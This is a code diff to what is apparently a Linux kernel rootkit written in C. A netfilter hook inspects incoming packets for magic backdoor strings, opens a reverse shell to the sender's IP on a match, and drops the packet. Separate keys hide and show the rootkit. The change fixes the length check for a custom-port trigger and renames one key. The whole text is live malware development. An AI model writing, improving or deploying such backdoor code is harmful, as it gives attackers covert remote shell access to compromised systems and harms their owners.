@@ -2,7 +2,7 @@
 #include "../revshell.h"
 
 const char* BACKDOOR_KEY_2600 = "2600_PAYLOAD_GET_REVERSE_SHELL";
-const char* BACKDOOR_KEY_2600_CUSTOM = "2600_PAYLOAD_GET_REVERSE_SHELL_";
+const char* BACKDOOR_KEY_2600_CUSTOM = "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_";
 const char* HIDE_ROOTKIT_KEY_2600 = "2600_HIDE_ROOTKIT";
 const char* SHOW_ROOTKIT_KEY_2600 = "2600_SHOW_ROOTKIT";
 
@@ -103,7 +103,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
             //TODO: Hide the backdoor packet to the local system
             return NF_DROP;
-        }else if (strlen(user_data) == strlen(BACKDOOR_KEY_2600_CUSTOM + 4)){
+        }else if (strlen(user_data) == strlen(BACKDOOR_KEY_2600_CUSTOM)+ 4){
             /****BACKDOOR KEY - Open a shell with custom port***/
             snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
             char last_four[5];  // +1 pour le caractère nul
